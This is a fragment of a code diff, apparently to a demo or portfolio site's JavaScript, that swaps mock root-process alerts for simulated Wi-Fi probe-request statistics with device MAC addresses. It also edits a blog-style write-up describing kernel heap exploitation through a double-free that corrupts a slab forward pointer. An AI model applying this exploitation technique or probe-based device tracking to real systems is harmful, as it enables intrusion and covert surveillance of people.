-            { text: "[ALERT: ROOT] PID: 18512 | UID: 0 | Comm: sudo | Executed: /usr/bin/sudo -i", type: "danger", delay: 600 },
-            { text: "[ALERT: ROOT] PID: 18515 | UID: 0 | Comm: bash | Executed: /usr/bin/apt update", type: "danger", delay: 300 },
-            { text: "[ALERT: ROOT] PID: 18590 | UID: 0 | Comm: kdevtmpfs | Executed: /tmp/pwn-canary", type: "danger", delay: 500 },
-            { text: "[!] CRITICAL WARNING: Non-standard daemon parent spawned root shell execution /tmp/pwn-canary", type: "danger", delay: 200 },
-            { text: "[USER] PID: 18602 | UID: 1000 | Comm: python3 | Executed: /usr/bin/python3 app.py", type: "text", delay: 400 }
+            { text: "[*] Accessing SQLite database probe_log.db...", type: "info" },
+            { text: "[~] Running telemetry audits...", type: "system", delay: 200 },
+            { text: "\n-  Probe Request Statistics  -\n", type: "success", delay: 200 },
+            { text: "Total probes captured:  1485", type: "text" },
+            { text: "Unique devices seen:    312", type: "text" },
+            { text: "Randomized MACS:        843", type: "text" },
+            { text: "Real MACS:              642", type: "text" },
+            { text: "\nTop 5 Vendors seen:", type: "info", delay: 150 },
+            { text: "   Apple, Inc.: 541 probes\n   Intel Corporation: 310 probes\n   Samsung Electronics: 182 probes\n   Unknown Vendor: 154 probes\n   Google LLC: 120 probes", type: "text" },
+            { text: "\nTop 5 Most Active Devices:", type: "info", delay: 150 },
+            { text: "   bc:a9:20:d1:f2:8c (Apple, Inc.) -> 184 probes\n   00:13:e8:f0:19:bc (Intel Corporation) -> 122 probes\n   46:d0:11:e9:28:fb (Unknown Vendor) -> 98 probes\n   e4:aa:ea:11:ff:02 (Samsung Electronics) -> 82 probes\n   70:85:c2:d9:22:11 (Google LLC) -> 74 probes", type: "text", delay: 300 }
         ]
     }
 };
@@ -385,7 +544,7 @@ dummy_ptrs = [allocate_object(i) for i in range(50)]
 target_a = allocate_object(51)
 target_b = allocate_object(52)
 free_object(target_a) # Hole 1
-free_object(target_b) # Hole 2</code></pre>
+free_object(target_b) # Hole 2</blockquote>
 
 <p>By exploiting the double-free, we corrupt the slab chunk's forward pointer (FD), making it point directly to our target function table inside kernel space. This allowed us to hijack execution flow once a read operation was initiated on the modified object structure.</p>`
     },
